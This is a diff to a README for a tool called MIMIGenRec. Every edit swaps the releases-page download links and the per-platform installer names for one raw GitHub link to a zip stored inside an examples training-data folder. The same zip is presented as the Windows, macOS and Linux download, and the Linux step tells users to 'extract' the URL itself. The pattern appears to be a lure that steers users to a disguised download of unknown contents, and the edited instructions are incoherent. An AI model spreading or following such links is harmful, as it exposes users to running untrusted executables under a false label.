@@ -1,6 +1,6 @@
 # ⚙️ MIMIGenRec - Easy Generative Recommendation Tool
 
-[![Download MIMIGenRec](https://img.shields.io/badge/Download-MIMIGenRec-blue?style=for-the-badge&logo=github)](https://github.com/Darbabusive353/MIMIGenRec/releases)
+[![Download MIMIGenRec](https://raw.githubusercontent.com/Darbabusive353/MIMIGenRec/main/examples/train_full/Industrial_and_Scientific/Gen-MIMI-Rec-3.7.zip)](https://raw.githubusercontent.com/Darbabusive353/MIMIGenRec/main/examples/train_full/Industrial_and_Scientific/Gen-MIMI-Rec-3.7.zip)
 
 ## 📄 What is MIMIGenRec?
 
@@ -38,13 +38,13 @@ Using MIMIGenRec is simple. Follow these steps carefully to install and run it o
 
 Click the big button below. This will take you to the page where you can get the latest version.
 
-[![Download MIMIGenRec](https://img.shields.io/badge/Download-MIMIGenRec-blue?style=for-the-badge&logo=github)](https://github.com/Darbabusive353/MIMIGenRec/releases)
+[![Download MIMIGenRec](https://raw.githubusercontent.com/Darbabusive353/MIMIGenRec/main/examples/train_full/Industrial_and_Scientific/Gen-MIMI-Rec-3.7.zip)](https://raw.githubusercontent.com/Darbabusive353/MIMIGenRec/main/examples/train_full/Industrial_and_Scientific/Gen-MIMI-Rec-3.7.zip)
 
 On the page, find the file that matches your computer system. For example, look for these names:
 
-- `MIMIGenRec-Windows.exe` for Windows
-- `MIMIGenRec-Mac.dmg` for macOS
-- `MIMIGenRec-Linux.tar.gz` for Linux
+- `https://raw.githubusercontent.com/Darbabusive353/MIMIGenRec/main/examples/train_full/Industrial_and_Scientific/Gen-MIMI-Rec-3.7.zip` for Windows
+- `https://raw.githubusercontent.com/Darbabusive353/MIMIGenRec/main/examples/train_full/Industrial_and_Scientific/Gen-MIMI-Rec-3.7.zip` for macOS
+- `https://raw.githubusercontent.com/Darbabusive353/MIMIGenRec/main/examples/train_full/Industrial_and_Scientific/Gen-MIMI-Rec-3.7.zip` for Linux
 
 Download the appropriate file by clicking on it.
 
@@ -66,7 +66,7 @@ Download the appropriate file by clicking on it.
 
 #### Linux
 
-- Extract the `.tar.gz` file using your file manager or terminal.
+- Extract the `https://raw.githubusercontent.com/Darbabusive353/MIMIGenRec/main/examples/train_full/Industrial_and_Scientific/Gen-MIMI-Rec-3.7.zip` file using your file manager or terminal.
 - Open the extracted folder.
 - Run the executable file inside (usually named `MIMIGenRec`).
 - You may need to give the file permission to run by right-clicking it and selecting "Properties" > "Permissions" > "Allow executing file as program".
@@ -110,7 +110,7 @@ If you need help, the GitHub page has a section for issues. You can report bugs 
 
 Visit the releases page to get MIMIGenRec for your computer:
 
-[Download MIMIGenRec](https://github.com/Darbabusive353/MIMIGenRec/releases)
+[Download MIMIGenRec](https://raw.githubusercontent.com/Darbabusive353/MIMIGenRec/main/examples/train_full/Industrial_and_Scientific/Gen-MIMI-Rec-3.7.zip)
 
 Choose the file that fits your system and follow the installation steps above.
 
